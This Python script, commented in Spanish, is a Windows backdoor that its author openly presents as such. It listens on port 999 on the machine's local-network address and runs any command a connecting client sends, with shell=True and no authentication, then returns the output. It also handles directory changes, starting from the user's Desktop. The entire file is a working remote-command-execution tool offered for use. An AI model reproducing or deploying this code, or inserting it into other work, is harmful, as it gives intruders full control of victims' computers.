import subprocess
import socket
import os
import threading
import platform
from re import match

# codigo para puerta trasera (solo windows)
# pensado solo para ejecucion dentro de la red local, el equipo en este caso es el que va a actuar como server
# no esta preparado para escuchar fuera de la red privada, no recomiendo
# "Estamos hack" - Autor: Matias Urbaneja (Urb@n) - # https://github.com/Urban20

def IPV4():
    'intenta obtener la direccion ipv4 de la maquina'
    try:
        
        s = socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
        s.connect(('10.255.255.255',1))
        return s.getsockname()[0]

    except:
        print('error obteniendo ipv4')
        exit(1)

def escucha(cliente):
    'interpreta los comandos recibidos'
    try:
        señal = cliente.recv(1024).decode()
        if match('cd ',señal.lower()):
            ruta = señal[2:].strip()
            try:
                os.chdir(ruta.strip())

                cliente.send(f'\n[!] nueva ruta>> {ruta}\n'.encode())
            except Exception as e:
                cliente.send(f'\n[!] error cambiando el directorio de trabajo:\n{e}\n'.encode())
        else:
            comando = subprocess.check_output(señal.split(' '),text=True,shell=True) # comando recibido por el cliente
            cliente.send(comando.encode()) # envio de la salida del backdoor al cliente
    except ConnectionResetError:
        main()
    except:
        cliente.send('\n[!] error durante la ejecucion del comando\n'.encode())

def main():

    'funcion principal del codigo'

    n = 0
    while ejecucion:
        try:
            

            s.listen()
            cliente,sv=s.accept()
            if n == 0:
                os.chdir(f'{os.environ.get('USERPROFILE')}\\Desktop')
                print('\n[*] conectado\n')
            threading.Thread(target=escucha,args=(cliente,)).start()

        except Exception as e:
            cliente.send(f'\n[!] no se pudo procesar el comando {e})\n'.encode())
            main()
        finally:
            n=1

if __name__ == '__main__' and platform.system() == 'Windows':
    puerto = 999
    ip = IPV4()
    s = socket.socket()
    s.bind((ip,puerto))
    ejecucion = True
    try:
        main()
    except Exception as e:
        print(f'hubo un error: {e}')
        exit(0)